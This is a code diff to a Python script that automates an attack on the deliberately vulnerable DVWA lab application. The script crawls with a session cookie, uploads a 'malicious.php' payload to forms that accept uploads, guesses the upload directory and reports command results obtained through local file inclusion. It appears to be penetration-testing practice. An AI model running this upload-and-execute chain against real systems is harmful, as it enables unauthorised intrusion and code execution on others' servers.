@@ -8,7 +8,9 @@ import lfi
 import uploadv2
 
 
-BASE_URL = "http://localhost/DVWA/" #"http://192.168.52.129/DVWA/"
+URL = "http://localhost/DVWA/" #"http://192.168.52.129/DVWA/"
+UPLOAD_DIR = f"{URL}hackable/uploads/"
+UPLOAD_DIR_WORDLIST = "upload_dir_wordlists.txt"
 WORDLIST = "wordlists/test"
 COOKIE = {
     'PHPSESSID': 'ks3ah94pfi21cdhe2ck77b6h6g',
@@ -18,13 +20,6 @@ COOKIE = {
 PAYLOAD_FILENAME = "malicious.php"
 REPORT_FILENAME = "vuln_report.txt"
 
-def get_args():
-    parser = ArgumentParser()
-    parser.add_argument("--url", default=BASE_URL, help="Target Base URL")
-    parser.add_argument("--wordlist", default=WORDLIST, help="Wordlist for crawler")
-    parser.add_argument("--upload-url-wordlist", default="upload_url_wordlist.txt", help="Wordlist for upload URLs")
-    parser.add_argument("--upload-dir-wordlist", default="upload_dir_wordlist.txt", help="Wordlist for upload directories")
-    return parser.parse_args()
 
 def generate_report(uploaded_url, lfi_url, command_results):
     report = "Vulnerability Report\n"
@@ -41,14 +36,13 @@ def generate_report(uploaded_url, lfi_url, command_results):
     print(f"[+] Report generated: {REPORT_FILENAME}")
 
 def main():
-    args = get_args()
     session = requests.Session()
     
     # Main function
-    found_urls, uploadable_urls = crawler.main_crawl(args.url, args.wordlist, COOKIE)
+    found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
     print("Crawling complete.")
 
-    found_urls = crawler.clean_found_urls(args.url, found_urls)
+    found_urls = crawler.clean_found_urls(URL, found_urls)
 
     print("Found URLs:")
     for url in found_urls:
@@ -63,18 +57,24 @@ def main():
     payload_filenames = uploadv2.create_payloads()
 
     # Use dynamic wordlists to determine endpoints:
-    dynamic_upload_url = uploadv2.try_upload_url(args.url, args.upload_url_wordlist, COOKIE, PAYLOAD_FILENAME)
-    if dynamic_upload_url is None:
-        print("[-] No valid upload URL found. Exiting.")
-        exit(1)
-    dynamic_upload_dir = uploadv2.get_upload_directory(args.url, args.upload_dir_wordlist)
-    print(f"Dynamic Upload URL: {dynamic_upload_url}")
+    # dynamic_upload_url = uploadv2.try_upload_url(args.url, args.upload_url_wordlist, COOKIE, PAYLOAD_FILENAME)
+    # if dynamic_upload_url is None:
+    #     print("[-] No valid upload URL found. Exiting.")
+    #     exit(1)
+
+    for url in uploadable_urls:
+        if uploadv2.upload_file(url, PAYLOAD_FILENAME, COOKIE):
+            print(f"[+] File upload Success. URL: {url}.")
+
+    
+    dynamic_upload_dir = uploadv2.get_upload_directory(URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE)
+    # print(f"Dynamic Upload URL: {dynamic_upload_url}")
     print(f"Dynamic Upload Directory: {dynamic_upload_dir}")
 
-    # Upload the payload using the dynamic endpoint
-    if not uploadv2.upload_file(dynamic_upload_url, PAYLOAD_FILENAME, COOKIE):
-        print("[-] File upload failed. Exiting.")
-        exit(1)
+    # # Upload the payload using the dynamic endpoint
+    # if not uploadv2.upload_file(dynamic_upload_url, PAYLOAD_FILENAME, COOKIE):
+    #     print("[-] File upload failed. Exiting.")
+    #     exit(1)
     direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
     print(f"[+] Direct file URL (if accessible): {direct_file_url}")
 
